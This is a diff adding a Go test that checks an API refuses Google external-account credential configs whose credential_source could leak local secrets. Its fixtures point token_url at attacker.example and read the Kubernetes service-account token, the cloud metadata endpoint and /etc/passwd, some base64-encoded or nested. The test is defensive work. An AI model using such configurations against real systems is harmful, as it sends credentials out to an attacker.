@@ -488,3 +488,32 @@ func TestNewDeliveryError(t *testing.T) {
 		})
 	}
 }
+
+// D9: a credential_source makes the Google library read a local resource and send it to token_url.
+func TestCheckAPIWriteRefusesCredentialSource(t *testing.T) {
+	external := func(source string) string {
+		return `{"type":"external_account","audience":"a","subject_token_type":"t","token_url":"https://attacker.example/token","credential_source":` + source + `}`
+	}
+	for _, tc := range []struct {
+		name, credentials string
+		refused           bool
+	}{
+		{name: "service account", credentials: `{"type":"service_account","project_id":"p"}`},
+		{name: "file source", credentials: external(`{"file":"/var/run/secrets/kubernetes.io/serviceaccount/token"}`), refused: true},
+		{name: "url source", credentials: external(`{"url":"http://169.254.169.254/latest/meta-data"}`), refused: true},
+		{name: "aws source", credentials: external(`{"environment_id":"aws1","region_url":"http://169.254.169.254"}`), refused: true},
+		{name: "base64", credentials: base64.StdEncoding.EncodeToString([]byte(external(`{"file":"/etc/passwd"}`))), refused: true},
+		{name: "nested in impersonation", credentials: `{"type":"impersonated_service_account","source_credentials":` + external(`{"file":"/x"}`) + `}`, refused: true},
+		{name: "invalid document", credentials: "not json"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			err := checkAPIWrite(map[string]any{"project_id": "p", "CREDENTIALS": tc.credentials})
+			if !tc.refused {
+				assert.NoError(t, err)
+				return
+			}
+			require.EqualError(t, err, "credentials: a credential_source is accepted only from output files or credentials_file")
+		})
+	}
+	assert.NoError(t, checkAPIWrite(map[string]any{"credentials_file": "/run/secrets/gcp.json"}), "the file is checked against api.secret_dirs")
+}
